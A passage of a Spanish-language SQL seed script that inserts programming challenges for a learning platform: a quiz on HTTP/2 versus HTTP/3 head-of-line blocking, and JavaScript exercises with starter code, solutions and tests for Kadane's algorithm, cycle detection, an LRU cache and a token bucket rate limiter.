  -- ORO 14: HTTP/2 vs HTTP/3 y Bloqueo Head-of-Line (Quiz)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Redes Avanzadas: HTTP/2 vs HTTP/3 y Head-of-Line Blocking',
    'Comprende por qué HTTP/3 reemplazó TCP por QUIC sobre UDP para solucionar el bloqueo de cabecera.',
    '# Evolución de Protocolos Web: De HTTP/1.1 a HTTP/3

### 1. HTTP/1.1:
- Cada petición requería una conexión TCP individual (o secuencial en keep-alive).
- **Head-of-Line Blocking (HOL) en Aplicación:** Si una petición se demoraba, todas las siguientes debían esperar.

### 2. HTTP/2 (Multiplexación sobre TCP):
- Introdujo frames binarios y streams multiplexados sobre una **única conexión TCP compartida**.
- **El Problema Persistente (HOL en Transporte):** Dado que TCP garantiza entrega estricta y ordenada, si se pierde **un solo paquete IP** en la red por congestión o WiFi inestable, TCP congela la entrega de **TODOS** los streams multiplexados hasta que el paquete perdido sea retransmitido.

### 3. HTTP/3 (QUIC sobre UDP):
- Abandona TCP y utiliza **QUIC**, un protocolo de transporte que corre sobre **UDP**.
- **Solución Total:** En QUIC, los streams son entidades independientes de transporte. Si se pierde un paquete del Stream 1, **los Streams 2, 3 y 4 continúan entregándose a la aplicación sin 1 milisegundo de retraso**.',
    'quiz',
    '[{"question": "¿Por qué HTTP/2 seguía sufriendo de Head-of-Line Blocking ante pérdida de paquetes y cómo lo resolvió HTTP/3?", "options": ["En HTTP/2, al usar TCP, la pérdida de un paquete congela todos los streams multiplexados hasta retransmitirlo; HTTP/3 usa QUIC sobre UDP donde cada stream es independiente en transporte", "HTTP/2 solo permitía texto plano y HTTP/3 incorporó compresión gzip", "HTTP/2 no era compatible con certificados SSL y requería conexiones no cifradas", "HTTP/3 elimina el protocolo IP y envía datos directamente mediante broadcast Ethernet"], "correctIndex": 0, "explanation": "El Head-of-Line Blocking en HTTP/2 ocurría en la capa de transporte TCP: ante una pérdida de paquetes, TCP frena la cola completa. HTTP/3 implementa QUIC sobre UDP, logrando streams verdaderamente independientes que no se bloquean entre sí ante pérdidas de red."}]',
    240,
    14
  );

  -- ============================================================================
  -- 🥇 SECCIÓN 6: ALGORITMOS Y ESTRUCTURAS DE DATOS AVANZADAS
  -- ============================================================================

  -- ORO 15: Algoritmo de Kadane - Subarreglo de Suma Máxima (Código JS)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, initial_code, solution_code, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Algoritmos: Máximo Subarreglo Continuo (Kadane)',
    'Encuentra la suma máxima de un subarreglo contiguo en tiempo lineal O(N) y memoria O(1).',
    '# El Algoritmo de Kadane (Maximum Subarray)

Dado un arreglo `nums` de números enteros (que puede contener números negativos y positivos), tu objetivo es encontrar la **suma máxima** de cualquier subarreglo contiguo.

### Ejemplo:
`nums = [-2, 1, -3, 4, -1, 2, 1, -5, 4]`
El subarreglo contiguo con la suma más grande es `[4, -1, 2, 1]`, cuya suma es:
$$4 + (-1) + 2 + 1 = 6$$

### Lógica de Programación Dinámica en $O(N)$:
En cada posición $i$, decidimos:
- ¿Nos conviene sumar `nums[i]` a la racha acumulada anterior?
- ¿O la racha anterior es negativa y nos conviene empezar un nuevo subarreglo desde `nums[i]`?

$$\text{maxActual} = \max(\text{nums}[i], \text{maxActual} + \text{nums}[i])$$
$$\text{maxGlobal} = \max(\text{maxGlobal}, \text{maxActual})$$',
    'javascript',
    'function maxSubArray(nums) {
  // Implementa el algoritmo de Kadane en O(N)
}',
    'function maxSubArray(nums) {
  if (!nums || nums.length === 0) return 0;

  let maxActual = nums[0];
  let maxGlobal = nums[0];

  for (let i = 1; i < nums.length; i++) {
    maxActual = Math.max(nums[i], maxActual + nums[i]);
    maxGlobal = Math.max(maxGlobal, maxActual);
  }

  return maxGlobal;
}',
    'test("Arreglo con negativos y positivos", () => {
  expect(maxSubArray([-2, 1, -3, 4, -1, 2, 1, -5, 4])).toBe(6);
});
test("Arreglo de un solo elemento", () => {
  expect(maxSubArray([1])).toBe(1);
});
test("Todos elementos negativos", () => {
  expect(maxSubArray([-5, -3, -1, -4])).toBe(-1);
});
test("Arreglo completamente positivo", () => {
  expect(maxSubArray([5, 4, 1, 7, 8])).toBe(25);
});',
    250,
    15
  );

  -- ORO 16: Detección de Dependencias Circulares en Grafos (Código JS)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, initial_code, solution_code, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Algoritmos: Detección de Ciclos en Grafos Dirigidos',
    'Detecta dependencias circulares entre módulos de software utilizando DFS o Algoritmo de Kahn.',
    '# Detección de Ciclos en Grafos de Dependencias

Al compilar proyectos de software (como paquetes npm o módulos Maven), si el módulo $A$ depende de $B$, $B$ de $C$ y $C$ de $A$, existe una **dependencia circular** que impide determinar el orden de compilación (Topological Sort).

### Tu Misión:
Implementa la función `tieneCiclo(numNodos, aristas)` donde:
- `numNodos`: Número total de nodos etiquetados de `0` a `numNodos - 1`.
- `aristas`: Lista de pares `[origen, destino]` que representan dependencias dirigidas.

Devuelve `true` si el grafo contiene al menos un ciclo, o `false` si es un Grafo Acíclico Dirigido (DAG).',
    'javascript',
    'function tieneCiclo(numNodos, aristas) {
  // Retorna true si hay un ciclo en el grafo dirigido
}',
    'function tieneCiclo(numNodos, aristas) {
  const adj = Array.from({ length: numNodos }, () => []);
  const inDegree = new Array(numNodos).fill(0);

  for (const [u, v] of aristas) {
    adj[u].push(v);
    inDegree[v]++;
  }

  // Algoritmo de Kahn (BFS con in-degrees)
  const queue = [];
  for (let i = 0; i < numNodos; i++) {
    if (inDegree[i] === 0) {
      queue.push(i);
    }
  }

  let visitados = 0;
  while (queue.length > 0) {
    const nodo = queue.shift();
    visitados++;

    for (const vecino of adj[nodo]) {
      inDegree[vecino]--;
      if (inDegree[vecino] === 0) {
        queue.push(vecino);
      }
    }
  }

  // Si no visitamos todos los nodos, hay un ciclo
  return visitados !== numNodos;
}',
    'test("Grafo con ciclo circular simple (0->1->2->0)", () => {
  const aristas = [[0, 1], [1, 2], [2, 0]];
  expect(tieneCiclo(3, aristas)).toBe(true);
});
test("Grafo acíclico lineal (0->1->2)", () => {
  const aristas = [[0, 1], [1, 2]];
  expect(tieneCiclo(3, aristas)).toBe(false);
});
test("Grafo con múltiples ramas sin ciclos", () => {
  const aristas = [[0, 1], [0, 2], [1, 3], [2, 3]];
  expect(tieneCiclo(4, aristas)).toBe(false);
});
test("Grafo con ciclo aislado", () => {
  const aristas = [[0, 1], [2, 3], [3, 2]];
  expect(tieneCiclo(4, aristas)).toBe(true);
});',
    260,
    16
  );

  -- ORO 17: Implementación de una Caché LRU (Código JS)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, initial_code, solution_code, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Estructuras de Datos: Caché LRU (Least Recently Used)',
    'Construye una estructura de caché con límite de capacidad que desaloje la clave menos recientemente usada.',
    '# Caché LRU (Least Recently Used)

El algoritmo **LRU** desaloja el elemento que lleva más tiempo sin ser consultado o modificado cuando se supera la capacidad máxima.

### Métodos Requeridos:
- `constructor(capacity)`: Inicializa la caché con capacidad fija $N > 0$.
- `get(key)`: Retorna el valor de la clave si existe; de lo contrario retorna `-1`. Al consultar una clave, pasa a ser la más recientemente usada.
- `put(key, value)`: Actualiza o inserta la clave. Si la clave no existía y la capacidad está llena, desaloja la clave menos recientemente usada (LRU).',
    'javascript',
    'class LRUCache {
  constructor(capacity) {
    this.capacity = capacity;
    this.map = new Map();
  }

  get(key) {
    // Implementar get con actualización de recencia
  }

  put(key, value) {
    // Implementar put con desalojo por capacidad
  }
}',
    'class LRUCache {
  constructor(capacity) {
    this.capacity = capacity;
    this.map = new Map();
  }

  get(key) {
    if (!this.map.has(key)) return -1;
    const val = this.map.get(key);
    // En JS Map, re-insertar mueve la clave al final (más reciente)
    this.map.delete(key);
    this.map.set(key, val);
    return val;
  }

  put(key, value) {
    if (this.map.has(key)) {
      this.map.delete(key);
    } else if (this.map.size >= this.capacity) {
      // El primer elemento del iterador es el más antiguo (LRU)
      const lruKey = this.map.keys().next().value;
      this.map.delete(lruKey);
    }
    this.map.set(key, value);
  }
}',
    'test("Operaciones básicas de LRUCache", () => {
  const cache = new LRUCache(2);
  cache.put(1, 1);
  cache.put(2, 2);
  expect(cache.get(1)).toBe(1);       // 1 pasa a ser más reciente
  cache.put(3, 3);                   // Desaloja la clave 2
  expect(cache.get(2)).toBe(-1);      // 2 no existe
  cache.put(4, 4);                   // Desaloja la clave 1
  expect(cache.get(1)).toBe(-1);      // 1 no existe
  expect(cache.get(3)).toBe(3);
  expect(cache.get(4)).toBe(4);
});
test("Actualización de clave existente no desaloja", () => {
  const cache = new LRUCache(2);
  cache.put(1, 10);
  cache.put(1, 20);
  expect(cache.get(1)).toBe(20);
});',
    260,
    17
  );

  -- ORO 18: Algoritmo Token Bucket para Rate Limiting (Código JS)
  INSERT INTO public.challenges (
    module_id, title, description, theory, challenge_type, initial_code, solution_code, test_code, xp_reward, order_index
  ) VALUES (
    v_gold_module_id,
    'Sistemas & Concurrencia: Rate Limiter Token Bucket',
    'Implementa el algoritmo estándar de la industria para limitar peticiones por segundo en APIs y microservicios.',
    '# Algoritmo Token Bucket

El algoritmo **Token Bucket** se utiliza en firewalls, API Gateways (como Kong o NGINX) y proxies inversos para aplicar límites de tasa (**Rate Limiting**).

### Principio de Funcionamiento:
- Una cubeta tiene una capacidad máxima de tokens (`capacity`).
- Se recarga constantemente a una tasa fija de `refillRate` tokens por segundo.
- Cada petición requiere consumir $K$ tokens (habitualmente 1).
- Si hay suficientes tokens disponibles, se descuentan y la petición es aceptada (`true`).
- Si no hay suficientes tokens, la petición es rechazada (`false` / HTTP 429 Too Many Requests).

### Tu Misión:
Implementa la clase `TokenBucket` con el método `consumir(tokensRequeridos, timestampMs)`.',
    'javascript',
    'class TokenBucket {
  constructor(capacity, refillRatePerSec) {
    this.capacity = capacity;
    this.refillRatePerSec = refillRatePerSec;
    this.tokens = capacity;
    this.lastRefillTimestamp = 0;
  }

  consumir(tokensRequeridos, timestampMs) {
    // Calcula tokens rellenados según el tiempo transcurrido y evalúa disponibilidad
  }
}',
    'class TokenBucket {
  constructor(capacity, refillRatePerSec) {
    this.capacity = capacity;
    this.refillRatePerSec = refillRatePerSec;
    this.tokens = capacity;
    this.lastRefillTimestamp = null;
  }

  consumir(tokensRequeridos, timestampMs) {
    if (this.lastRefillTimestamp === null) {
      this.lastRefillTimestamp = timestampMs;
    } else {
      const deltaSegundos = (timestampMs - this.lastRefillTimestamp) / 1000;
      if (deltaSegundos > 0) {
        const nuevosTokens = deltaSegundos * this.refillRatePerSec;
        this.tokens = Math.min(this.capacity, this.tokens + nuevosTokens);
        this.lastRefillTimestamp = timestampMs;
      }
    }

    if (this.tokens >= tokensRequeridos) {
      this.tokens -= tokensRequeridos;
      return true;
    }
    return false;
  }
}',
    'test("Consumo dentro de capacidad inicial", () => {
  const bucket = new TokenBucket(5, 1); // 5 tokens max, 1 token/seg
  expect(bucket.consumir(3, 1000)).toBe(true);
  expect(bucket.consumir(2, 1000)).toBe(true);
  expect(bucket.consumir(1, 1000)).toBe(false); // Vaciado
});
test("Recarga de tokens tras paso del tiempo", () => {
  const bucket = new TokenBucket(5, 2); // 2 tokens/seg
  expect(bucket.consumir(5, 0)).toBe(true);
  expect(bucket.consumir(1, 0)).toBe(false);
  // Pasan 1.5 segundos -> +3 tokens
  expect(bucket.consumir(3, 1500)).toBe(true);
});',
    260,
    18
  );

END $ARENA_GOLD_SEED$;
